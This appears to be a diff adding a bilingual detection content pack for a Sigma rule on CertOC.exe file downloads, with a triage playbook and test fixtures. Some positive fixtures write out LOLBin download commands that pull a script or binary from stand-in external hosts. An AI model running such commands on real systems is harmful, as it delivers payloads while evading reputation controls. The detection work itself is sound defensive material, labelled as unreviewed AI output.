@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "70ad0861-d1fe-491c-a45f-fa48148a300d",
+    "title": "File Download via CertOC.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certoc_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certoc_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó CertOC.exe con la opción -GetCACAPS y una URL HTTP/HTTPS. Es una técnica LOLBAS conocida para descargar archivos con un binario firmado por Microsoft.",
+      "what_it_detects": "Creación de procesos donde Image termina en \\certoc.exe u OriginalFileName es CertOC.exe, y CommandLine contiene a la vez '-GetCACAPS' y 'http'. CertOC es una utilidad de certificados de Windows Server; -GetCACAPS consulta una URL y guarda la respuesta, lo que permite descargar contenido arbitrario.",
+      "why_it_matters": "Corresponde a ATT&CK T1105 (Ingress Tool Transfer): un atacante usa un binario legítimo para traer herramientas o payloads al endpoint y evadir controles basados en reputación de binarios.",
+      "triage_steps": [
+        "Revise CommandLine completo: identifique la URL, el dominio o la IP, y si apunta a un servicio interno de CA o a un destino externo desconocido.",
+        "Compare Image con OriginalFileName: si Image no es C:\\Windows\\System32\\certoc.exe, el binario fue copiado o renombrado, lo que es altamente sospechoso.",
+        "Analice ParentImage y la cadena de procesos: cmd.exe, powershell.exe, wscript.exe u Office como padre indican ejecución por script o macro.",
+        "Valide el usuario: ¿es un administrador de PKI que normalmente trabaja con CertOC en ese servidor?",
+        "Busque en el mismo host, +/- 15 minutos, archivos creados en el directorio de trabajo y procesos hijos que ejecuten lo descargado.",
+        "Pivote por la URL o IP de destino en logs de proxy, DNS y firewall, y en otros hosts de la organización.",
+        "Consulte alertas previas del mismo host y usuario, especialmente uso de CertOC con -LoadDLL u otros LOLBins."
+      ],
+      "false_positives": [
+        "Administradores de PKI que prueban las capacidades de una CA interna con -GetCACAPS contra un endpoint HTTP corporativo conocido.",
+        "Scripts de validación o monitoreo de servicios de certificados documentados por el equipo de infraestructura."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del host o del equipo de PKI si la ejecución estaba autorizada.",
+        "Si no lo estaba, aísle el endpoint y bloquee la URL, el dominio o la IP en proxy y firewall.",
+        "Obtenga el archivo descargado, calcule su hash y analícelo en sandbox antes de eliminarlo.",
+        "Elimine artefactos y mecanismos de persistencia confirmados, restablezca credenciales de la cuenta implicada y busque el mismo indicador en otros hosts."
+      ],
+      "severity_rationale": "Nivel medio: es un LOLBin con uso legítimo poco frecuente y no hay falsos positivos conocidos, pero una descarga por sí sola no confirma ejecución ni compromiso."
+    },
+    "en": {
+      "summary": "CertOC.exe was run with -GetCACAPS and an HTTP/HTTPS URL. This is a known LOLBAS technique for downloading files with a Microsoft-signed binary.",
+      "what_it_detects": "Process creation where Image ends with \\certoc.exe or OriginalFileName is CertOC.exe, and CommandLine contains both '-GetCACAPS' and 'http'. CertOC is a Windows Server certificate utility; -GetCACAPS queries a URL and saves the response, which allows downloading arbitrary content.",
+      "why_it_matters": "Maps to ATT&CK T1105 (Ingress Tool Transfer): an attacker uses a trusted binary to bring tools or payloads onto the endpoint and bypass binary-reputation controls.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL, domain or IP and decide whether it is an internal CA service or an unknown external host.",
+        "Compare Image with OriginalFileName: if Image is not C:\\Windows\\System32\\certoc.exe, the binary was copied or renamed, which is highly suspicious.",
+        "Check ParentImage and the process tree: cmd.exe, powershell.exe, wscript.exe or Office parents suggest script or macro execution.",
+        "Validate the user: is this a PKI administrator who normally uses CertOC on this server?",
+        "On the same host, +/- 15 minutes, look for files written in the working directory and child processes running the download.",
+        "Pivot on the destination URL or IP in proxy, DNS and firewall logs, and across other hosts.",
+        "Review earlier alerts for the same host and user, especially CertOC -LoadDLL or other LOLBin activity."
+      ],
+      "false_positives": [
+        "PKI administrators testing an internal CA's capabilities with -GetCACAPS against a known corporate HTTP endpoint.",
+        "Documented certificate-service validation or monitoring scripts run by the infrastructure team."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or PKI team whether the execution was authorized.",
+        "If not, isolate the endpoint and block the URL, domain or IP at the proxy and firewall.",
+        "Collect the downloaded file, hash it and analyze it in a sandbox before removing it.",
+        "Remove confirmed artifacts and persistence, reset credentials for the involved account and hunt for the same indicator on other hosts."
+      ],
+      "severity_rationale": "Medium fits: this LOLBin is rarely used legitimately and has no known false positives, but a download alone does not confirm execution or compromise."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "certoc.exe from System32 downloading a script from an external URL, launched from PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certoc.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "certoc.exe -GetCACAPS https://files.example.com/update.ps1",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Temp\\"
+        }
+      },
+      {
+        "description": "Renamed CertOC copy in a public folder, detected via OriginalFileName, downloading over HTTP from an IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-PKI-02.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Users\\Public\\cx.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "C:\\Users\\Public\\cx.exe -getcacaps http://198.51.100.20/tools/agent.bin",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\Users\\Public\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate CertOC use adding a root certificate to the store; no -GetCACAPS or URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-PKI-01.andes.example.com",
+          "User": "ANDES\\admin_pki",
+          "Image": "C:\\Windows\\System32\\certoc.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "certoc.exe -addstore root C:\\certs\\andes-rootca.cer",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\certs\\"
+        }
+      },
+      {
+        "description": "certutil.exe fetching a URL; the URL and download intent are present, but the binary is not CertOC",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0187.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -f http://crl.example.org/ca.crl ca.crl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\Users\\mrojas\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
